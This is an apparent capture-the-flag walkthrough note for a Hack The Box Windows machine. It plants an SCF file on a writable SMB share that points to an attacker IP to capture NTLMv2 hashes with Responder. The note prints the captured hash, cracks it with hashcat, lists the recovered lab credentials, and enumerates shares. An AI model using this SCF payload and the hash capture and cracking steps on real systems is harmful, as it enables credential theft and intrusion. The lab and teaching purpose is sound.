
However even if a file share doesn’t contain any data that could be used to connect to other systems but it is configured with write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users or Meterpreter shells.
```
smb-share-scf-file attacks
```

@scf_attack.scf
```
[Shell]
Command=2
IconFile=\\10.10.16.5\share\scf.ico
[Taskbar]
Command=ToggleDesktop
```

Keep in mind that we have to turn SMB and HTTP on in order to get the hashes
```
responder -I tun0
```

Will put the scf file in the smb share that has the write permission
![[Pasted image 20240408010339.png]]

![[Pasted image 20240408010456.png]]
```
amanda::HTB:5165db0c61c9befc:5E88322BD4CC4F3272FB6958A1E7637C:0101000000000000802977C40089DA0153FC1F5362145D8A00000000020008004F004B005A00330001001E00570049004E002D005A0032005100470047003400550056004D0039004A0004003400570049004E002D005A0032005100470047003400550056004D0039004A002E004F004B005A0033002E004C004F00430041004C00030014004F004B005A0033002E004C004F00430041004C00050014004F004B005A0033002E004C004F00430041004C0007000800802977C40089DA0106000400020000000800300030000000000000000100000000200000564A2F5C50875389F258A8BCBAD9A9633A8FE15715B464828BBC0106A11E8E810A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003500000000000000000000000000
```

Let's crack the hash using hashcat

```
hashcat --help | grep NTLM
```
![[Pasted image 20240408011837.png]]


We know that the version of hash is NTLMV2 which is either 5600 or 27100 so will go with 5600 as we already know about it
```
.\hashcat.exe -m 5600 -a 0 -D 2 .\hashes4.txt .\rockyou.txt -O
```
![[Pasted image 20240408012428.png]]

So we got a user and password
```
AMANDA
```

```
Ashare1972
```

So what is the 1st thing comes to my mind is 
SMB
srvcert
so many things will go one by one

```
http://10.10.10.103/certsrv/
```
![[Pasted image 20240408012748.png]]


```
cme smb 10.10.10.103 -u 'AMANDA' -p 'Ashare1972' --shares
```
![[Pasted image 20240408012930.png]]

As well as we got another option to check the read / write access
```
smbmap -u amanda -d HTB.local -p 'Ashare1972' -H 10.10.10.103
```
![[Pasted image 20240410152512.png]]

We got a low level use as we got the read access


